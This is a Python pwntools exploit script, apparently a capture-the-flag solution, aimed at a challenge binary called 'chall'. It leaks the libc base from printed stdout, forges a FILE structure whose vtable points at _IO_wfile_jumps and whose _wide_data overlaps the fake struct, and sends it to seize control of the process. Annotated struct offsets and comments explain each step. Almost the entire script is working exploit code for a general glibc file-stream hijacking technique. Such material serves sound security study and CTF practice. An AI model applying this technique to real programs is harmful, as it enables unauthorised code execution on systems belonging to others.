#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')

libc = ELF('libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b main
command
 b *_IO_flush_all
 b *_IO_wdoallocbuf
end
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil(b"stdout : ");
libc.address = int(io.recv(14),16)-libc.sym._IO_2_1_stdout_ # got libc base address
print(f"[+] libc base:{libc.address:#x} ")


fp = FileStructure()

fp._lock = libc.sym._IO_2_1_stdout_ +0x1000 # set _lock value to some writable area 

#fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#we need to set this   _IO_write_ptr > _IO_write_base  to pass the check to call _IO_OVERFLOW (fp, EOF) 
fp._IO_write_ptr = 1; # rest are set to 0  by pwntools 

fp.vtable = libc.sym._IO_wfile_jumps # send fake vtable to call vulnerable functions that uses _wide_data to call operations on wide char


fp._wide_data = libc.sym._IO_2_1_stdout_+8 # point  _wide_data struct to our std file struct 

"""
 ptype /ox {FILE}0
type = struct _IO_FILE {
/* 0x0000      |  0x0004 */    int _flags;
/* XXX  4-byte hole      */
/* 0x0008      |  0x0008 */    char *_IO_read_ptr; <--- point fake _wide_data to our forged file struct
/* 0x0010      |  0x0008 */    char *_IO_read_end;
/* 0x0018      |  0x0008 */    char *_IO_read_base;
/* 0x0020      |  0x0008 */    char *_IO_write_base;
/* 0x0028      |  0x0008 */    char *_IO_write_ptr;
/* 0x0030      |  0x0008 */    char *_IO_write_end;
/* 0x0038      |  0x0008 */    char *_IO_buf_base;
/* 0x0040      |  0x0008 */    char *_IO_buf_end;
/* 0x0048      |  0x0008 */    char *_IO_save_base;
/* 0x0050      |  0x0008 */    char *_IO_backup_base;
/* 0x0058      |  0x0008 */    char *_IO_save_end;
/* 0x0060      |  0x0008 */    struct _IO_marker *_markers;
/* 0x0068      |  0x0008 */    struct _IO_FILE *_chain;
/* 0x0070      |  0x0004 */    int _fileno;
/* 0x0074: 0x0 |  0x0004 */    int _flags2 : 24;
/* 0x0077      |  0x0001 */    char _short_backupbuf[1];
/* 0x0078      |  0x0008 */    __off_t _old_offset;
/* 0x0080      |  0x0002 */    unsigned short _cur_column;
/* 0x0082      |  0x0001 */    signed char _vtable_offset;
/* 0x0083      |  0x0001 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/* 0x0088      |  0x0008 */    _IO_lock_t *_lock;
/* 0x0090      |  0x0008 */    __off64_t _offset;
/* 0x0098      |  0x0008 */    struct _IO_codecvt *_codecvt;
/* 0x00a0      |  0x0008 */    struct _IO_wide_data *_wide_data;
/* 0x00a8      |  0x0008 */    struct _IO_FILE *_freeres_list;
/* 0x00b0      |  0x0008 */    void *_freeres_buf;
/* 0x00b8      |  0x0008 */    struct _IO_FILE **_prevchain;
/* 0x00c0      |  0x0004 */    int _mode;
/* 0x00c4      |  0x0014 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             }
"""

#we are pointing _wide_data to offset of 8 with our file struct so that _wide_data struct can be overlapped with our file struct. 



io.sendline(bytes(fp))

io.interactive()

